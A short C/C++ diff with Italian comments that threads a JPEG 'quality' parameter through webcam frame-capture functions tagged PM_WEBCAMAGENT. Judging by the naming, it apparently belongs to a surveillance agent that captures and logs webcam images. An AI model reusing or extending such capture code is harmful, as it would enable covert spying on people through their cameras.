@@ -10,7 +10,7 @@
 #define SAFE_RELEASE(x) if (x) {x->Release(); x=NULL;}
 
 // Definita in BitmapCommon
-extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData);
+extern void BmpToJpgLog(DWORD agent_tag, BYTE *additional_header, DWORD additional_len, BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality);
 
 void FreeMediaType(AM_MEDIA_TYPE& mt)
 {
@@ -35,9 +35,9 @@ void DeleteMediaType(AM_MEDIA_TYPE *pmt)
 }
 
 // Scrive l'immagine
-void WriteCamBitmap(BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData)
+void WriteCamBitmap(BITMAPINFOHEADER *pBMI, size_t cbBMI, BYTE *pData, size_t cbData, DWORD quality)
 {
-	BmpToJpgLog(PM_WEBCAMAGENT, NULL, 0, pBMI, cbBMI, pData, cbData);
+	BmpToJpgLog(PM_WEBCAMAGENT, NULL, 0, pBMI, cbBMI, pData, cbData, quality);
 }
 
 void GetDefaultCapDevice(IBaseFilter **ppCap)
@@ -86,7 +86,7 @@ void GetDefaultCapDevice(IBaseFilter **ppCap)
 	SAFE_RELEASE(pEm);
 }
 
-void CameraGrab()
+void CameraGrab(DWORD quality)
 {
 	HRESULT hr;
 	long evCode;
@@ -213,7 +213,7 @@ void CameraGrab()
 			(mt.cbFormat >= sizeof(VIDEOINFOHEADER)) &&
 			(mt.pbFormat != NULL)) {
 			VIDEOINFOHEADER *pVih = (VIDEOINFOHEADER*)mt.pbFormat;
-			WriteCamBitmap(&pVih->bmiHeader, mt.cbFormat - SIZE_PREHEADER, pBuffer, cbBuffer);
+			WriteCamBitmap(&pVih->bmiHeader, mt.cbFormat - SIZE_PREHEADER, pBuffer, cbBuffer, quality);
 		}
 		FreeMediaType(mt);
 
